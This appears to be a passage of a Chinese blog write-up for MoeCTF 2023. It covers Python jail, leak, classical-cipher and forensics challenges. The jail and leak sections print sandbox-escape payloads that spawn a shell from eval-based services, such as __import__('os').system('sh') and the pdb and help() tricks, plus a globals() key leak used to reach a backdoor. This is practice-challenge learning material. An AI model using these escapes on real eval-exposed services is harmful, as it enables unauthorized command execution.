<p>网上搜到有个思路是二次传参，exec(input())但是超了一个字符</p>
<p>有个breakpoint()函数，可以打开一个叫pdb(python debugger)的调试器，这个调试器可以执行python代码，还有打断点调试代码</p>
<p>进入后用第一题的__ import __ (‘os’).system(‘sh’)就能打开一个终端，然后 cat flag拿到flag</p>
<p>flag{Wk1Sp0Q4gA6at3kySUmJhtdZq_AitxwJ}</p>
<h2 id="Jail-lavel-2"><a href="#Jail-lavel-2" class="headerlink" title="Jail lavel 2"></a>Jail lavel 2</h2><p>这里加了个长度限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>可以使用help()函数 查看sys模块，sys模块下有个: 可以传递参数过去当shell命令执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br><span class="line">sys</span><br><span class="line">!</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p>flag{iQR2CFeLlJ8Hi8ydPGs-HVHXSmGiQxwP}</p>
<h2 id="Jail-Level-3-未解决"><a href="#Jail-Level-3-未解决" class="headerlink" title="Jail Level 3 [未解决]"></a>Jail Level 3 [未解决]</h2><p>长度不超过12 且不可用breakpoint ,hint中help被禁用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>



<h2 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h2><p>是一个不断循环 的eval(input)，python2.7环境的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>拿到flag flag{MvhG6P0cpa4yavJzq6gcJAYgGfNSi5yZ}</p>
<h2 id="Leak-Leval-0"><a href="#Leak-Leval-0" class="headerlink" title="Leak Leval 0"></a>Leak Leval 0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Options: | [V] uln | [B] ackdoor &quot;</span>)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">        not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;vvvveeee&#x27;</span>) <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">        <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>) <span class="keyword">if</span> (<span class="built_in">len</span>(code) &gt; <span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>) <span class="keyword">if</span> func_filter(code):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>) exit(<span class="number">0</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code)) <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>) key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>) <span class="keyword">if</span> (key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>vuln 9的长度可以用globals() 将真正的key给找出来，然后用backdoor执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">globals() #找到了key &#x27;key_6366a131649a4e9b&#x27;: &#x27;4e86eda06366a131649a4e9be1a9f217&#x27;</span><br><span class="line">4e86eda06366a131649a4e9be1a9f217</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GjyJBWFLfQoLO8qiZpIMjKQEjl-MBKnq&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F&#125;%0N</span><br></pre></td></tr></table></figure>

<p>查询了一下rot编码的原理，原理是将字符的ascii往前推</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a> 使用这里的rot47拿到flag，少了个m需要补充一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;</span><br></pre></td></tr></table></figure>



<h2 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h2><p>搜索围墙这个词，搜到了栅栏密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp&#125;e&#123;ciri_hT_avn3Fa_j</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a> 在线解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj&#125;</span><br></pre></td></tr></table></figure>



<h2 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h2><p>观察长度，字符结构，像是将每个字符的ascii偏移n位，搜索到了凯撒密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tvljam&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/caesar-cipher">https://www.lddgo.net/encrypt/caesar-cipher</a> 偏移7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;</span><br></pre></td></tr></table></figure>



<h2 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h2><p>这个题好坑啊，这里这个md5是key的md5，不是flag的md5，但是上面写着md5 of flag，我解了半天出不来，想来想去也不是代码逻辑有问题，弄了几组数据进去，脚本都没有问题。</p>
<p>密文看起来像是每位都偏移了n位，明文前六位是moectf，然后跑了一下脚本发现每位偏移都不太一样，也没有什么规律。后面发现是维吉尼亚密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br><span class="line"></span><br><span class="line">md5 of flag (utf-8) `ea23f80270bdd96b5fcd213cae68eea5`</span><br></pre></td></tr></table></figure>

<p>网上查询到，维吉尼亚密码首先要确定key的长度，算出来是7，然后前六位moectf算出前六位key，爆破第七位和md5比较拿到key解密flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virginiaCrack</span>(<span class="params">cipherText,key</span>): <span class="comment"># 解密函数</span></span><br><span class="line">    length = getKeyLen(cipherText) <span class="comment">#得到密钥长度</span></span><br><span class="line">    <span class="comment"># key = getKey(cipherText,length) #找到密钥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        key = <span class="string">&quot;moectf&quot;</span> + i</span><br><span class="line">        keyStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">            keyStr+=k</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the key:&#x27;</span>,keyStr)</span><br><span class="line">        plainText = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> cipherText:</span><br><span class="line">                c = <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch)-<span class="built_in">ord</span>(key[index%length]))%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">                plainText += c</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(plainText)</span><br><span class="line">        <span class="keyword">return</span> plainText</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据明文和密文偏移关系求前面的key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_key</span>(<span class="params">plaintext, ciphertext</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p, c <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, ciphertext):</span><br><span class="line">        p_idx = alphabet.index(p)</span><br><span class="line">        c_idx = alphabet.index(c)</span><br><span class="line"></span><br><span class="line">        k_idx = (c_idx - p_idx) % <span class="number">26</span></span><br><span class="line">        key += alphabet[k_idx]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt_extended</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    key = key.lower()</span><br><span class="line">    key_expanded = (key * (<span class="built_in">len</span>(ciphertext) // <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="built_in">len</span>(ciphertext)]</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            k = key_expanded[key_index]</span><br><span class="line">            c_idx = alphabet.index(c)</span><br><span class="line">            k_idx = alphabet.index(k)</span><br><span class="line"></span><br><span class="line">            p_idx = (c_idx - k_idx) % <span class="number">26</span></span><br><span class="line">            plaintext += alphabet[p_idx]</span><br><span class="line"></span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">plaintext_prefix = <span class="string">&quot;moectf&quot;</span></span><br><span class="line">ciphertext_prefix = <span class="string">&quot;scsfct&quot;</span></span><br><span class="line">md5_target = <span class="string">&quot;ea23f80270bdd96b5fcd213cae68eea5&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#前六位key</span></span><br><span class="line">key_prefix = vigenere_key(plaintext_prefix, ciphertext_prefix)</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破第七位key</span></span><br><span class="line">key_candidates = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> key_candidates:</span><br><span class="line">    test_key = key_prefix + candidate</span><br><span class="line">    decrypted_text = vigenere_decrypt_extended(ciphertext_prefix, test_key)</span><br><span class="line">    <span class="keyword">if</span> md5_hash(decrypted_text) == md5_target:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line">ciphertext_lower = ciphertext.lower()</span><br><span class="line">decrypted_text_full = vigenere_decrypt_extended(ciphertext_lower, test_key)</span><br><span class="line">decrypted_text_restored = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    [decrypted_text_full[i] <span class="keyword">if</span> c.islower() <span class="keyword">else</span> decrypted_text_full[i].upper() <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text_restored)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;</span><br></pre></td></tr></table></figure>





<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h1 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h1><h2 id="AI入门指北"><a href="#AI入门指北" class="headerlink" title="AI入门指北"></a>AI入门指北</h2><p>在这找到不带gpu版本的安装命令 <a target="_blank" rel="noopener" href="https://pytorch.org/">https://pytorch.org/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;install_torch_torchvision_torchaudio&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h2><p>校园网好卡，附件下载了半天，解压后发现全是vmdk的文件</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jcjic/article/details/118241188">https://blog.csdn.net/jcjic/article/details/118241188</a> 根据这篇文章创建了一个win10虚拟机然后导入vmdk进入了系统</p>
<p>发现有一个磁盘被bitlook锁住了，然后在回收站这发现了这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BitLocker Drive Encryption recovery key </span><br><span class="line"></span><br><span class="line">To verify that this is the correct recovery key, compare the start of the following identifier with the identifier value displayed on your PC.</span><br><span class="line"></span><br><span class="line">Identifier:</span><br><span class="line"></span><br><span class="line">	4DFEE901-55AC-43EB-96F4-FFE09609952A</span><br><span class="line"></span><br><span class="line">If the above identifier matches the one displayed by your PC, then use the following key to unlock your drive.</span><br><span class="line"></span><br><span class="line">Recovery Key:</span><br><span class="line"></span><br><span class="line">	702801-061622-323125-555819-258544-713713-089331-406373</span><br><span class="line"></span><br><span class="line">If the above identifier doesn&#x27;t match the one displayed by your PC, then this isn&#x27;t the right key to unlock your drive.</span><br><span class="line">Try another recovery key, or refer to https://go.microsoft.com/fwlink/?LinkID=260589 for additional assistance.</span><br></pre></td></tr></table></figure>

<p>解锁磁盘后发现flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0=</span><br></pre></td></tr></table></figure>

<p>base64解码获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Bas1c_D15k_F0r3ns1cs!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h2><p>查询资料后发现在 ~&#x2F;.mozilla&#x2F;firefox&#x2F;…….. 下有个places.sqlite存储浏览器的历史记录和标签。</p>
<p>然后 moz_places表中存储网站url 标题等相关信息</p>
<p>在这个表中发现了<a target="_blank" rel="noopener" href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> 这个网站，尝试访问一下发现打开了，没什么功能</p>
<p>f12找到了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  I am always thinking about creating a flag that is safe enough.</span><br><span class="line">  I came up with lots of ideas and moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br><span class="line">  Next step is to hide it into this page!</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h2><p>一开始不太懂dumpmem.raw和qaq.hc 是什么文件，搜索了一下后发现一个是内存镜像，一个是用VeraCrypt加密的文件。然后找到了这个内存软件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3/">https://github.com/volatilityfoundation/volatility3/</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f dumpmem.raw --profile Win2016x64_14393 filescan | findstr /R &quot;txt png jpg gif zip rar 7z pdf doc&quot;</span><br></pre></td></tr></table></figure>

<p>找到一个key 0x958246a8c550	\Users\Administrator\Desktop\key_pixiv_id105614615.png	，但是dumpfile不下来，翻了很多issue还有试过换3,也是dump不下来</p>
<p>一开始考虑到图片下载网站略缩图的原因，可能我根据id搜下载下来的key不正确，最后dumpfile没有思路的时候，试了一下搜索下载当key，然后解出来了</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv3744376/">https://www.bilibili.com/read/cv3744376/</a> p站搜id的方法</p>
<p><a target="_blank" rel="noopener" href="http://www.pixiv.net/member.php?id=105614615">http://www.pixiv.net/member.php?id=105614615</a> 搜到了图片 解密了.hc文件</p>
<p>tmp目录下发现 history.db siyuan.db还有pandoc，搜了一下pandoc是一个文档转换的程序，siyuan是一个插件，在siyuan.db中的 block_fts_content中发现了.sy的文件名还有内容</p>
<p>NVXWKY3UMZ5VGMC7MQZTG4DMPFPUQMLEMRSW4IL5 这像是某种编码，根据搜索编码特征后，发现是base32</p>
<p><a target="_blank" rel="noopener" href="https://www.lzltool.cn/Tools/Base32Decode">https://www.lzltool.cn/Tools/Base32Decode</a></p>
<p>解密后得到flag </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;S0_d33ply_H1dden!&#125;</span><br></pre></td></tr></table></figure>



<p>ww，moectf学到挺多东西的捏，入门了re和pwn，后面比较忙就没有继续做了qaq</p>
</p></div><div class="post-footer"><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: Yourname</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf-writeup/" title="ctf writeup">ctf writeup </a><span class="leancloud_visitors"></span><span>About 13815 words, 46 min 3 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0Anyyyddddn%20%C2%B7%20moectf_wp%0Ahttps://nyyyddddn.github.io/2023/12/28/moectf-wp/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/12/28/GeekChallenge2023/" title="GeekChallenge2023">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/" title="exp本地不通远程通的问题">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>